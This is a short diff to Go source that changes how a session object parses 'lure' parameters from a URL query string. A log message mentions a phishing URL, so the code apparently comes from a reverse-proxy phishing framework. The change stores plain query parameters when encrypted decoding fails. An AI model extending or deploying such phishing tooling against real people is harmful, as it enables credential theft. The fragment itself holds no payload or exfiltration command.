@@ -146,14 +146,13 @@ func (s *Session) Finish(is_auth_url bool) {
 	}
 }
 
-// extract lure params from encrypted query string
 func (s *Session) ExtractLureParams(u *url.URL) bool {
 	var ret bool = false
 	vals := u.Query()
 
 	var enc_key string
 
-	for _, v := range vals {
+	for k, v := range vals {
 		if len(v[0]) > 8 {
 			enc_key = v[0][:8]
 			enc_vals, err := base64.RawURLEncoding.DecodeString(v[0][8:])
@@ -184,8 +183,10 @@ func (s *Session) ExtractLureParams(u *url.URL) bool {
 					log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
 				}
 			} else {
-				log.Debug("extractParams: %s", err)
+				s.Params[k] = v[0]
 			}
+		} else {
+			s.Params[k] = v[0]
 		}
 	}
 	return ret
